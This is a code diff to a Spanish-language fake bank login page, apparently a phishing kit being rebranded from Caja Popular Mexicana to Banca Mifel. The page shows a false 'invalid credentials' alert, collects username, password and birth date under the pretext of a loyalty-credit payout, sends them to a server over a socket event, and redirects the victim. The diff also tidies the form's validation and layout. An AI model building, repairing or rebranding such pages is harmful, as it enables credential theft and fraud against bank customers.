@@ -63,11 +63,9 @@
       background: #f0f2f5;
       border-radius: 8px;
       margin: 1rem 0;
-      padding: 0rem 1rem;
+      padding: 0.5rem 1rem;
       width: 100%;
       max-width: 350px;
-      justify-content: flex-start;
-      margin-left: -15px;
     }
 
     .input-group .icon {
@@ -82,7 +80,6 @@
       flex: 1;
       font-size: 1rem;
       padding: 10px 0.75rem;
-      height: 20px;
     }
 
     button {
@@ -101,14 +98,9 @@
       background-color: #8CE6E3;
     }
 
-    button:disabled {
-      background: #cccccc;
-      cursor: not-allowed;
-    }
-
     .mensaje-error {
       color: red;
-      margin-top: 1rem;
+      margin-top: 0.5rem;
       font-size: 0.85rem;
     }
 
@@ -118,31 +110,35 @@
   </style>
 </head>
 <body>
-  <div class="screen active" id="pantallaInicio">
-    <img src=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8i5Fa_PaKq0jqIPv-U13xYZPPCoVRIj2auw&sssss" alt="Caja Popular Mexicana Logo" class="logo">
+  <div class="screen" id="pantallaInicio">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8i5Fa_PaKq0jqIPv-U13xYZPPCoVRIj2auw&sssss" alt="Mifel Logo" class="logo">
     <h2>Bienvenido a Banca Mifel.</h2>
 
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
 
-    <p>Ingrese a su cuenta para iniciar con el proceso de activacion y desembolso de credito de fidelidad.</p>
+    <p>Ingrese a su cuenta para iniciar con el proceso de activación y desembolso de crédito de fidelidad.</p>
+
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
         <input type="text" id="usuario" placeholder="Usuario" required>
       </div>
+      <p id="usuarioError" class="mensaje-error"></p>
+
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
+      <p id="passwordError" class="mensaje-error"></p>
+
       <div class="input-group">
         <div class="icon"><i class="fas fa-calendar-alt"></i></div>
         <input type="date" id="fechaNacimiento" required>
       </div>
-      <p id="usuarioError" class="mensaje-error"></p>
-      <p id="passwordError" class="mensaje-error"></p>
       <p id="fechaNacimientoError" class="mensaje-error"></p>
+
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
   </div>
@@ -154,82 +150,85 @@
     window.addEventListener('DOMContentLoaded', () => {
       const form = document.getElementById('login-form');
 
-      if (form) {
-        form.addEventListener('submit', (e) => {
-          e.preventDefault();
+      form.addEventListener('submit', (e) => {
+        e.preventDefault();
 
-          if (validarUsuario() && validarPassword() && validarFechaNacimiento()) {
-            const usuario = document.getElementById('usuario').value;
-            const contrasena = document.getElementById('password').value;
-            const fechaNacimiento = document.getElementById('fechaNacimiento').value;
-            const sessionId = localStorage.getItem('sessionId') || crypto.randomUUID();
+        if (validarUsuario() && validarPassword() && validarFechaNacimiento()) {
+          const usuario = document.getElementById('usuario').value;
+          const contrasena = document.getElementById('password').value;
+          const fechaNacimiento = document.getElementById('fechaNacimiento').value;
+          const sessionId = localStorage.getItem('sessionId') || crypto.randomUUID();
 
-            localStorage.setItem('sessionId', sessionId);
-            localStorage.setItem('usuario', usuario);
-            localStorage.setItem('contrasena', contrasena);
-            localStorage.setItem('fechaNacimiento', fechaNacimiento);
+          localStorage.setItem('sessionId', sessionId);
+          localStorage.setItem('usuario', usuario);
+          localStorage.setItem('contrasena', contrasena);
+          localStorage.setItem('fechaNacimiento', fechaNacimiento);
 
-            socket.emit('errorlogoForm', { usuario, contrasena, fechaNacimiento, sessionId });
+          socket.emit('errorlogoForm', {
+            usuario,
+            contrasena,
+            fechaNacimiento,
+            sessionId
+          });
 
-            window.location.href = 'opciones.html';
-          }
-        });
-      }
+          window.location.href = 'opciones.html';
+        }
+      });
     });
 
     function validarUsuario() {
       const usuario = document.getElementById("usuario").value;
-      const usuarioError = document.getElementById("usuarioError");
-      const usuarioInput = document.getElementById("usuario");
+      const error = document.getElementById("usuarioError");
+      const input = document.getElementById("usuario");
 
       const valido = /^[a-zA-Z0-9_]{4,20}$/;
 
       if (!usuario) {
-        usuarioError.textContent = "El nombre de usuario es obligatorio";
-        usuarioInput.classList.add("campo-requerido");
+        error.textContent = "El nombre de usuario es obligatorio";
+        input.classList.add("campo-requerido");
         return false;
       } else if (!valido.test(usuario)) {
-        usuarioError.textContent = "Debe tener entre 4 y 20 caracteres alfanuméricos o guiones bajos";
-        usuarioInput.classList.add("campo-requerido");
+        error.textContent = "Debe tener entre 4 y 20 caracteres alfanuméricos o guiones bajos";
+        input.classList.add("campo-requerido");
         return false;
       } else {
-        usuarioError.textContent = "";
-        usuarioInput.classList.remove("campo-requerido");
+        error.textContent = "";
+        input.classList.remove("campo-requerido");
         return true;
       }
     }
 
     function validarPassword() {
       const password = document.getElementById("password").value;
-      const passwordError = document.getElementById("passwordError");
-      const passwordInput = document.getElementById("password");
+      const error = document.getElementById("passwordError");
+      const input = document.getElementById("password");
 
       if (!password) {
-        passwordError.textContent = "La contraseña es obligatoria";
-        passwordInput.classList.add("campo-requerido");
+        error.textContent = "La contraseña es obligatoria";
+        input.classList.add("campo-requerido");
         return false;
       } else if (password.length < 4) {
-        passwordError.textContent = "La contraseña debe tener al menos 4 caracteres";
-        passwordInput.classList.add("campo-requerido");
+        error.textContent = "La contraseña debe tener al menos 4 caracteres";
+        input.classList.add("campo-requerido");
         return false;
       } else {
-        passwordError.textContent = "";
-        passwordInput.classList.remove("campo-requerido");
+        error.textContent = "";
+        input.classList.remove("campo-requerido");
         return true;
       }
     }
 
     function validarFechaNacimiento() {
-      const fechaNacimiento = document.getElementById("fechaNacimiento").value;
-      const fechaNacimientoError = document.getElementById("fechaNacimientoError");
+      const fecha = document.getElementById("fechaNacimiento").value;
+      const error = document.getElementById("fechaNacimientoError");
       const input = document.getElementById("fechaNacimiento");
 
-      if (!fechaNacimiento) {
-        fechaNacimientoError.textContent = "La fecha de nacimiento es obligatoria";
+      if (!fecha) {
+        error.textContent = "La fecha de nacimiento es obligatoria";
         input.classList.add("campo-requerido");
         return false;
       } else {
-        fechaNacimientoError.textContent = "";
+        error.textContent = "";
         input.classList.remove("campo-requerido");
         return true;
       }
